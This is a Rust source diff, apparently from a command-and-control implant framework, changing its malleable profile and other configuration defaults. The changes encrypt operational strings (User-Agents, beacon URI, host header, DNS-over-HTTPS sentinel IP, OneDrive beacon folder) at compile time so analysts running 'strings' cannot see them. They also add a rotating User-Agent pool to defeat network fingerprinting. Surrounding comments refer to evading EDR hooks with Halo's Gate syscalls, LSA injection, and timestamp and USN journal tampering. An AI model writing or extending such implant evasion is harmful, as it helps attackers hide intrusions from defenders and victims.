@@ -364,6 +364,7 @@ fn default_lsa_whisperer_auto_inject() -> bool {
 /// when ntdll stubs are hooked by EDR.
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
+#[derive(Default)]
 pub enum SsnResolutionMethod {
     /// Halo's Gate: sorts Nt* exports by VA, scans adjacent unhooked stubs
     /// for SSN inference.  Battle-tested, no exceptions fired.
@@ -374,13 +375,8 @@ pub enum SsnResolutionMethod {
     ExceptionBased,
     /// Hybrid (default): tries exception-based first (faster, no syscall
     /// pattern scan), falls back to Halo's Gate on failure.
+    #[default]
     Hybrid,
-}
-
-impl Default for SsnResolutionMethod {
-    fn default() -> Self {
-        Self::Hybrid
-    }
 }
 
 /// Configuration for the indirect dynamic syscall resolution subsystem.
@@ -954,7 +950,9 @@ impl Default for PrefetchConfig {
 /// every Windows system and is accessed frequently, making its timestamps
 /// a natural-looking cover.
 fn default_reference_file() -> String {
-    r"C:\Windows\System32\ntdll.dll".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!(r"C:\Windows\System32\ntdll.dll"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 
 /// Configuration for MFT timestamp synchronization and USN journal cleanup.
@@ -1056,6 +1054,12 @@ impl Default for SleepConfig {
 pub struct MalleableProfile {
     #[serde(default = "default_user_agent")]
     pub user_agent: String,
+    /// Pool of alternate User-Agent strings.  On each C2 check-in cycle the
+    /// agent rotates through this pool so that network-level fingerprinting
+    /// based on a static UA string is ineffective.  When empty, only
+    /// `user_agent` is used (backward-compatible behaviour).
+    #[serde(default)]
+    pub user_agent_pool: Vec<String>,
     #[serde(default = "default_uri")]
     pub uri: String,
     #[serde(default = "default_host_header")]
@@ -1391,7 +1395,9 @@ fn default_quic_port() -> u16 {
     443
 }
 fn default_quic_alpn() -> String {
-    "h3".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("h3"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_quic_keepalive() -> u64 {
     30
@@ -1400,7 +1406,9 @@ fn default_quic_idle_timeout() -> u64 {
     60
 }
 fn default_quic_h3_path() -> String {
-    "/api/v1/update".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("/api/v1/update"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_quic_max_streams() -> u32 {
     8
@@ -1431,10 +1439,14 @@ impl Default for QuicC2Profile {
 }
 
 fn default_graph_channel() -> String {
-    "onedrive".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("onedrive"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_graph_beacon_folder() -> String {
-    "OrchestraData".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("OrchestraData"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_graph_polling_interval() -> u64 {
     60
@@ -1474,17 +1486,82 @@ pub enum SshAuthConfig {
     Agent,
 }
 
+/// MED-004: Operational config defaults are encrypted at compile time via
+/// `string_crypt::enc_str!` so they do not appear as plaintext in the binary.
+/// An analyst running `strings` will see only encrypted ciphertext, not the
+/// actual User-Agent, URI, host header, or sentinel IP.
 fn default_user_agent() -> String {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    ))
+    .trim_end_matches('\0')
+    .to_string()
+}
+
+/// Default pool of User-Agent strings used for rotation.  Each is encrypted
+/// with `string_crypt::enc_str!` at compile time so no plaintext UAs appear
+/// in the binary.  The pool covers recent Chrome, Firefox, and Edge variants
+/// on both Windows and macOS to blend in with typical endpoint traffic.
+fn default_user_agent_pool() -> Vec<String> {
+    vec![
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+        ))
+        .trim_end_matches('\0')
+        .to_string(),
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+        ))
+        .trim_end_matches('\0')
+        .to_string(),
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"
+        ))
+        .trim_end_matches('\0')
+        .to_string(),
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
+        ))
+        .trim_end_matches('\0')
+        .to_string(),
+        String::from_utf8_lossy(&string_crypt::enc_str!(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
+        ))
+        .trim_end_matches('\0')
+        .to_string(),
+    ]
+}
+
+impl MalleableProfile {
+    /// Returns the User-Agent string for the current C2 check-in cycle.
+    ///
+    /// If `user_agent_pool` is non-empty, the agent rotates through the pool
+    /// based on the current time (`jitter_index` typically comes from the
+    /// check-in counter or a monotonically-increasing sequence number).
+    /// If the pool is empty, falls back to the static `user_agent` field
+    /// for backward compatibility.
+    pub fn rotating_user_agent(&self, cycle_index: u64) -> &str {
+        if self.user_agent_pool.is_empty() {
+            return &self.user_agent;
+        }
+        let idx = (cycle_index as usize) % self.user_agent_pool.len();
+        &self.user_agent_pool[idx]
+    }
 }
 fn default_uri() -> String {
-    "/api/v1/update".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("/api/v1/update"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_host_header() -> String {
-    "cdn.example.com".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("cdn.example.com"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_doh_beacon_sentinel() -> String {
-    "1.2.3.4".to_string()
+    String::from_utf8_lossy(&string_crypt::enc_str!("1.2.3.4"))
+        .trim_end_matches('\0')
+        .to_string()
 }
 fn default_dns_prefix() -> String {
     crate::ioc::IOC_DNS_BEACON.to_string()
@@ -1494,6 +1571,7 @@ impl Default for MalleableProfile {
     fn default() -> Self {
         Self {
             user_agent: default_user_agent(),
+            user_agent_pool: default_user_agent_pool(),
             uri: default_uri(),
             host_header: default_host_header(),
             cdn_relay: false,
